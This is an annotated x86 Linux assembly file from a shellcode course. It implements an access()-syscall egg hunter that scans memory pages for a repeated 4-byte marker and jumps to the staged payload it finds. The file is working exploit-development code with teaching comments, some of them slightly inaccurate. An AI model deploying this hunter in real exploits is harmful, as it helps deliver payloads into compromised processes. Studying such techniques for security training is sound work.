; Paolo Stagno aka [VoidSec](https://voidsec.com)
; SLAE-1511

global _start

section .text
_start:
	mov ebx, 0x50905090		; ebx is initialized to point the 4 byte version of the egg (executable)
	xor ecx, ecx			; ecx zeroed out
	mul ecx					; multiplied, causing eax and edx to become 0 (clever trick)
next_page:
	or dx, 0xfff			; page alignment on current pointer EDX 4095 (clever trick since 4096 is hex is 0x1000 and contains null chars. we firstly put 4095 into ECX and then increment it by 1 to get what we want.)
; The reason these two operations are separate is because they are entry points for different conditions. In case that an invalid memory address is returned from the access system call, the page alignment branch is taken because it can be assumed that all addresses inside the current page are invalid. In the event that a valid pointer is returned from the system call but the egg does not match with its contents, the page alignment portion is skipped and the pointer is simply incremented, thus trying the next valid address within the current page.
next_addr:
	inc edx					; incremnt EDX to 4096 (PAGE_SIZE)
	pushad					; push all general content registers into the stack (preserve them across system call. eg. eax used both as input/output for syscall)
	lea ebx, [edx+0x4]		; ebx will point to pathname pointer (addr being validated); addr +4 because allows eight bytes of contiguous memory to be validated in a single swoop
	mov al, 0x21			; low byte of eax set to 21, syscall number for access
	int 0x80				; syscall
	cmp al, 0xf2			; compare syscall return (top half eax) 0xf2 = EFAULT
	popad					; restore general pourpose values
	jz next_page			; if ZF flag is set, jmp to next page
	cmp [edx], ebx			; compare pointer with the value of the egg
	jnz next_addr			; if ZF is set (does not match), jump to increment (next addr in current page)
	cmp [edx+0x4], ebx		; if egg match this time perform same comparison against 2nd part of egg
	jnz next_addr			; if does not match jump to increment
	jmp edx					; 2nd egg match, EGG FOUND, jmp into pointer at EDX value